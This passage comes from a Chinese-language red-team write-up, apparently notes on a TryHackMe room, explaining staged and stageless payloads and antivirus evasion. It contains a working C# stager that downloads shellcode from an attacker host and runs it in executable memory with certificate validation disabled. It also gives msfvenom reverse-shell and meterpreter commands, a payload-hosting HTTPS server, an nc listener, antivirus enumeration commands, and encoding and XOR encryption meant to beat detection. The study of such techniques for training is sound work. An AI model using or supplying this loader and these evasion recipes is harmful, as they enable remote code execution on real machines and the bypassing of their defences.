<li><strong>适用于受限环境</strong>：特别适合在无法进行出站网络连接的封闭网络或气隙网络（air-gapped networks）中使用。</li>
</ul>
<h3 id="分阶段-Payload"><strong>分阶段 Payload</strong></h3>
<p>分阶段 Payload 采用两步走策略。第一阶段是一个很小的 <strong>Stager</strong>（或称“小马”），它的唯一任务就是与攻击者服务器建立连接，然后下载并执行第二阶段的<strong>最终 Payload</strong>（或称“大马”）。</p>
<img src="/thm_rthe/fd8a98b3cb79cca98a1e0dfd0292ea61.png" class="" title="Staged Payload - Send ReveseShell">
<p><strong>优点：</strong></p>
<ul>
<li><strong>体积小</strong>：Stager 的体积很小，减少了初始文件的磁盘占用，更易于投递。</li>
<li><strong>增强隐蔽性</strong>：最终的 Payload 不会直接存储在磁盘上，而是在内存中加载和执行，这使得它更难被传统的基于签名的杀毒软件检测到。</li>
<li><strong>灵活性高</strong>：同一个 Stager 可以用于下载不同的最终 Payload，攻击者可以根据需要动态更换 Payload，而无需重新投递文件。</li>
<li><strong>保护 Payload</strong>：核心的恶意代码（最终 Payload）永远不会暴露在磁盘上，从而保护了其免受蓝队分析。</li>
</ul>
<hr>
<h3 id="选择合适的-Payload"><strong>选择合适的 Payload</strong></h3>
<ul>
<li>当你的目标是<strong>网络连接受限</strong>的环境，或者你想<strong>避免网络流量被监测</strong>时，<strong>无阶段</strong> Payload 是更好的选择。例如，进行 USB 投递攻击时，无阶段 Payload 能确保在没有网络连接的情况下也能成功执行。</li>
<li>当你的主要目标是<strong>最小化本地足迹</strong>，并<strong>避免被杀毒软件检测</strong>时，<strong>分阶段</strong> Payload 是更优的方案。它利用了内存执行的优势，让分析和取证变得更加困难。</li>
</ul>
<h4 id="Metasploit-中的-Stager">Metasploit 中的 Stager</h4>
<p>如果要生成反向 TCP shell，会发现有两种有效载荷可用于此目的，名称略有不同（注意 <code>shell</code> 之后的 <code>_</code> 与 <code>/</code> ）：</p>
<table>
<thead>
<tr>
<th>Payload</th>
<th>Type</th>
</tr>
</thead>
<tbody>
<tr>
<td>windows/x64/shell_reverse_tcp</td>
<td>Stageless payload</td>
</tr>
<tr>
<td>windows/x64/shell/reverse_tcp</td>
<td>Staged payload</td>
</tr>
</tbody>
</table>
<h4 id="创建你自己的-Stager">创建你自己的 Stager</h4>
<p>要创建分阶段有效载荷，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs">@mvelazc0 提供的 stager 代码</a>的略微修改版本。</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Net</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Text</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Configuration</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Install</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Security</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Cryptography</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">X509Certificates</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc</span></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flAllocationType</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">flProtect</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadAttributes</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwStackSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpStartAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">param</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwCreationFlags</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpThreadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span></span>
<span class="line"><span style="color: #ABB2BF">    [</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hHandle</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">dwMilliseconds</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x1000</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;https://10.11.141.2/shellcode.bin&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">Stager</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Stager</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">url</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 创建一个 WebClient 对象</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">WebClient</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">wc</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">WebClient</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 允许自签证书</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ServicePointManager</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">ServerCertificateValidationCallback</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">delegate</span><span style="color: #ABB2BF"> { </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">; };</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ServicePointManager</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">SecurityProtocol</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">SecurityProtocolType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Tls12</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 下载 Shellcode 写入到变量中</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">wc</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">DownloadData</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 分配内存</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF">)</span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">MEM_COMMIT</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">PAGE_EXECUTE_READWRITE</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 写入内存</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Marshal</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Copy</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">shellcode</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">)(</span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">), </span><span style="color: #E5C07B">shellcode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Length</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">		// 定义线程句柄</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">UInt32</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Zero</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 启动线程</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateThread</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">codeAddr</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">parameter</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">threadId</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">		// 等待线程执行完成</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">threadHandle</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0xFFFFFFFF</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>使用我们的 Stager 运行反向 Shell</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">生成一个</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">shellcode</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">7474</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">raw</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">shellcode.bin</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;\x00\x0a\x0d&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">创建自签证书</span></span>
<span class="line"><span style="color: #61AFEF">openssl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">req</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x509</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-newkey</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rsa:4096</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-keyout</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">key.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-out</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cert.pem</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-sha256</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-days</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3650</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-nodes</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-subj</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">启动</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTPS</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">服务器</span></span>
<span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;from http.server import HTTPServer, SimpleHTTPRequestHandler; import ssl; host, port = &quot;0.0.0.0&quot;, 443; httpd = HTTPServer((host, port), SimpleHTTPRequestHandler); context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); context.load_cert_chain(certfile=&quot;cert.pem&quot;, keyfile=&quot;key.pem&quot;); httpd.socket = context.wrap_socket(httpd.socket, server_side=True); print(f&quot;HTTPS server running on https://{host}:{port}/&quot;); httpd.serve_forever()&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">接收反向</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">shell</span></span>
<span class="line"><span style="color: #61AFEF">nc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-lvp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">7474</span></span></code></pre></div></div></figure>
<p>注意这里用的是 <code>SimpleHTTPRequestHandler</code> ，他支持文件共享。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">wmic</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">namespace</span><span style="color: #ABB2BF">:\\</span><span style="color: #E06C75">root</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">securitycenter2</span><span style="color: #ABB2BF"> path antivirusproduct</span><span style="color: #C678DD"> GET </span><span style="color: #ABB2BF">displayName,</span><span style="color: #E06C75">productState</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> pathToSignedProductExe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">tasklist</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">svc</span><span style="color: #ABB2BF"> | findstr Def</span></span>
<span class="line"><span style="color: #E06C75">tasklist</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">svc</span><span style="color: #ABB2BF"> | findstr Virus</span></span></code></pre></div></div></figure>
<h2 id="绕过杀软手段">绕过杀软手段</h2>
<h3 id="编码和加密">编码和加密</h3>
<p>把 shellcode 编码或者是直接用加密算法把 shellcode 加密，再在 loader 里面解密之后写入内存，这样能避免直接检查出 shellcode 的明文，绕过静态检测，不过有些杀软也有解密的功能</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 显示可用的编码器</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--list</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">encoders</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">grep</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">excellent</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># -e encoder</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># -i 迭代次数</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Windows</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">443</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-e</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x86/shikata_ga_nai</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;\x00&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">enc_shell.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 显示可用的加密方式</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--list</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">encrypt</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 使用 xor 加密</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/meterpreter/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=ATTACKER_IP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">7788</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--encrypt</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">xor</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--encrypt-key</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;MyZekr3tKey***&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">xored-revshell.exe</span></span></code></pre></div></div></figure>
<h4 id="创建自己的编码器">创建自己的编码器</h4>
<p>因为 MSF 创建的可以被检测到，所以我们要用自己的方式去处理。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个 chsarp 格式的 shell 马</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/x64/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">csharp</span></span></code></pre></div></div></figure>
<p>房间这里提供了一个加密器：</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Collections</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Generic</span><span style="color: #ABB2BF">;</span></span>
